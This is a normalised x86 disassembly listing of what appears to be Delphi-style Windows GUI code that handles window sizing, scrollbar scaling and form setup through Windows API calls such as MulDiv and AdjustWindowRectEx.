mov eax ebx
call sub_457a18
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_443dbc
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_457f68
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_443d80
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_443d80
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_41a040
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_440014
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458557
mov eax [ ebp - 0x10 ]
call sub_40321c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_457860
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_41a19c
xor ecx ecx
mov edx 0xb03e
call sub_441a58
inc ebx
dec esi
jne r-xdata
sub_458584
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_4580b8
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_4580b8
mov eax ebx
call sub_458560
jmp r-xdata
sub_4585e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4473c8
test al al
je r-xdata
xor eax eax
push ebp
push sub_4586cb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_457b80
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_457b80
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_4581ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_4581ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_4581ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4581ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_4581ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_4581ec
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_4586f0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_4403bc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4403e8
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_4403bc
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_4403e8
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4402a8
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_457f68
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_4402a8
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_4402ec
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_457f68
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_4402a8
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_457f68
mov eax ebx
call sub_4402a8
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_4402ec
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_4402ec
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_457f68
mov eax ebx
call sub_4402ec
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_458844
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_457f68
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_457f68
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4580b8
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4580b8
sub_4588e8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_458844
mov ecx edi
mov edx esi
mov eax ebx
call sub_446b98
pop edi
pop esi
pop ebx
retn
sub_458910
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_45897a
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_445678
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458981
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_458981
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_4589b9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_458560
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4589c0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_4589c0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4585e0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_458a34
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_4402ec
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_42a444
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_4402a8
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_42a444
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_418d90
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_4430f8
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_458aa4
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_458b05
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_4033a8
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_446408
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458b0c
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_458b34
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_458c98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_458c78
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_403164
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458c7f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_458c40
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_419f5c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_40316c
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
call sub_4039a8
sub_458cc0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403418
and [ ebx + 0x2f4 ] 0xdf
sub_458cf8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_458304
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_440014
xor edx edx
mov eax ebx
call sub_440038
mov edx 0x140
mov eax ebx
call sub_440060
mov edx 0xf0
mov eax ebx
call sub_440084
mov dl 0x1
mov eax [ r-xdata ]
call sub_4299d8
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_459614
mov dl 0x1
mov eax [ r-xdata ]
call sub_4237d4
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_43f480
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_403164
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_459978
xor edx edx
mov eax ebx
call sub_440a68
xor edx edx
mov eax ebx
call sub_4409d0
mov dl 0x1
mov eax ebx
call sub_447204
mov edx ebx
mov eax [ rw-data ]
call sub_45dfdc
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_458e71
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_41fddc
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_41a2e0
xor edx edx
mov eax ebx
call sub_41cd60
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_45ce84
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_458edc
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_4035a8
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_458fa6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45b800
mov eax [ ebp - 0x4 ]
call sub_4473c8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45e014
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_40321c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_40321c
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d3ac
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_45837c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458fad
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_458fc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_459001
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_459978
sub_459006
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403418
test al al
jne r-xdata
call sub_403a24
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_4039d0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_459978
sub_45903c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_45907d
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_45909c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_442960
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403418
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45b344
sub_4590d8
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_43fd74
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_41a040
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45a73c
mov edx esi
mov eax ebp
call sub_41a2e0
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45a714
mov edx esi
mov eax edi
call sub_45a73c
jmp r-xdata
xor edx edx
mov eax edi
call sub_45a6f0
sub_4591e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_443924
xor edx edx
push ebp
push sub_45943a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_443080
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4402c0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_440304
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_45956c
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_441a58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459441
mov eax [ ebp - 0x4 ]
call sub_44392c
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_458844
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_446b50
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_458844
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_446b50
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_423098
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_4230a0
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_459449
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4443cc
push 0x0
push 0x0
push ebx
push sub_459550
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_45951c
push ebx
push sub_459534
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_4594fb
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41d458
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_4409d0
sub_459587
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_458844
mov ecx edi
mov edx esi
mov eax ebx
call sub_446b50
mov eax ebx
call sub_459670
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_42313c
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_423158
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4402ec
mov ebp eax
push edi
push esi
mov eax ebx
call sub_4402a8
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_459918
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_459948
sub_459614
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_4470c4
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_4473c8
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_45b974
push eax
push 0x1
push 0x80
mov eax ebx
call sub_4470c4
push eax
call SendMessageA
pop ebx
retn
sub_4596a8
push ebx
mov ebx eax
mov eax ebx
call sub_45a5c4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_45973c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4470c4
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_44718c
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_4470c4
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_4470c4
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_4597c4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_447668
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_420160
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_420134
mov edi eax
mov eax edi
mov si 0xfff1
call sub_403418
test al al
jne r-xdata
sub_459830
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_403164
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_45985c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
mov eax ebp
